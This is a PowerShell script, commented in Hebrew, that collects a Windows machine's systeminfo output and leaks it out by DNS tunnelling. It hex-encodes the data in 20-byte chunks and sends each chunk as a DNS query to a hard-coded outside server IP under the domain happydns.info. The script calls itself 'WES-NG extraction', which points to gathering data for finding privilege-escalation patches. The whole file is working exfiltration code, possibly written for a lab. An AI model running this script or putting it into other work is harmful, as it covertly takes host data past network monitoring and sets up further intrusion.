function Send-ToMyDNS {
    param([string]$HexData, [int]$Sequence, [int]$IsLast)
    $serverIP = "134.199.229.158" # ה-IP של שרת הלינוקס שלכן
    $seqStr = $Sequence.ToString("0000")
    $domain = "d$($HexData).i$($seqStr).e$($IsLast).happydns.info"
    Resolve-DnsName -Name $domain -Server $serverIP -Type A -ErrorAction SilentlyContinue | Out-Null
}

Write-Host "--- Automated WES-NG Extraction Active ---" -ForegroundColor Cyan

# 🚀 השינוי: במקום Desktop, אנחנו מריצים את ה-systeminfo הרשמי ומנקים רווחים
$sysData = systeminfo | Out-String
$sysData = $sysData.Trim()

$infoBytes = [System.Text.Encoding]::ASCII.GetBytes($sysData)
$chunkSize = 20 
$totalChunks = [Math]::Max(1, [Math]::Ceiling($infoBytes.Length / $chunkSize))

Write-Host "Streaming $($infoBytes.Length) bytes of system configuration via DNS..." -ForegroundColor White

for ($i = 0; $i -lt $infoBytes.Length; $i += $chunkSize) {
    $currentSeq = [int]($i / $chunkSize) + 1
    $currentSize = [Math]::Min($chunkSize, $infoBytes.Length - $i)
    $chunk = $infoBytes[$i..($i + $currentSize - 1)]
    $hex = ($chunk | ForEach-Object { "{0:x2}" -f $_ }) -join ""
    $isEnd = if ($currentSeq -ge $totalChunks) { 1 } else { 0 }
    
    # הזרמת ה-Systeminfo בחתיכות בטוחות של 20 בייטים
    Send-ToMyDNS -HexData $hex -Sequence $currentSeq -IsLast $isEnd
    
    # השהיה קלה של 15 מילישניות כדי שפאקטים של UDP לא יאבדו בדרך בגלל גודל המידע
    Start-Sleep -Milliseconds 15
}

Write-Host "--- SUCCESS: Systeminfo streamed completely! ---" -ForegroundColor Green
